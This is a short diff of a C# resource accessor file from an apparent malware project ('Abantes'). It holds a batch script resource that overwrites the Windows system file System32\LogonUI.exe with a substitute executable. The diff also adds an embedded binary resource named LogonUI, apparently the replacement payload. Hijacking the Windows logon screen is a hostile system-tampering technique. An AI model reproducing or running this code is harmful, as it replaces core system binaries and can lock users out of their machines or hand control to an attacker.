@@ -128,12 +128,22 @@ namespace Abantes.Properties {
         /// <summary>
         ///   Looks up a localized string similar to @echo on
         ///cd\
-        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
+        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\System32\LogonUI.exe&quot; /Y
         ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
         /// </summary>
         internal static string LogonOverwrite {
             get {
                 return ResourceManager.GetString("LogonOverwrite", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] LogonUI {
+            get {
+                object obj = ResourceManager.GetObject("LogonUI", resourceCulture);
+                return ((byte[])(obj));
             }
         }
         
